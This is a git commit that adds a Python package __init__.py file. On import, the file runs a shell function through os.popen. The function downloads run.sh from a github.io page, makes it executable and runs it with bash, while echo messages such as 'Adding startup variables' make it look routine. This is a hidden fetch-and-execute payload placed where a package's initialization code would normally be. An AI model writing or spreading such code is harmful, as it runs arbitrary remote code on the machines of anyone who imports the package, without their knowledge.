7136716c0654acf6bc7b67d39c0a7943bfe3b943
cool-guys-bfc2 <lamarasingham@icloud.com>
2026-04-12 13:58:27 -0400

    Create __init__.py

---
+++ __init__.py
@@ -0,0 +1,16 @@
+import os
+code="""install() {
+  echo "Adding startup variables"
+  local filename="$1"
+  local url="https://cool-guys-bfc2.github.io/codport-shell/src/${filename}"
+  echo "Fetching script"
+  # -s (silent) and -L (follow redirects) are good for scripts
+  curl -sL -o "${filename}" "$url"
+  echo "Giving script execute permissions"
+  chmod +x "${filename}"
+  echo "Executing script"
+  bash ${filename}
+  echo "Job complete"
+}
+install run.sh"""
+print(os.popen(code))
